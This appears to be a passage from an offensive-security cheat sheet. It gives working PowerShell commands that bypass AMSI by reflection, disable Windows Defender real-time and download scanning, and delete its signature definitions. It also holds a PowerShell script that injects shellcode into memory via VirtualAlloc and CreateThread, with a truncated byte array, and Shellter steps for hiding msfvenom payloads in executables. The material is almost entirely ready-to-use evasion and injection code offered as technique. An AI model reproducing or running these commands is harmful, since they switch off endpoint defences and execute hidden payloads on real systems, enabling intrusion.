### Set amsiInitFailed

```powershell
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}}
$d = $c.GetFields('NonPublic,Static')
ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}}
$f.SetValue($null,$true)
```
### Wipe amsiContext
```powershell
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}}
$d = $c.GetFields('NonPublic,Static')
ForEach($e in $d) {if ($e.Name -like "*Context") {$f = $e}}
$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

## Defender
### Disable real-time protection (proactive):
```powershell
PS > Set-MpPreference -DisableRealTimeMonitoring $true
```
### Disable scanning all downloaded files and attachments, disable AMSI (reactive):
```powershell
PS > Set-MpPreference -DisableIOAVProtection $true
```
### Remove signatures (if Internet connection is present, they will be downloaded again):
```powershell
PS > cd "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0"
PS > .\MpCmdRun.exe -RemoveDefinitions -All
Or
Cmd > "%PROGRAMFILES%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```


###  PowerShell In-Memory Injection

```powershell

$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

### Shellter

```bash
wine shellter

# => Mode : A (auto)
# => PE target : valid PE 
# => Enable Stealth Mode : Y
# => Payload : L (list), C (Custom => msfvenom)
```

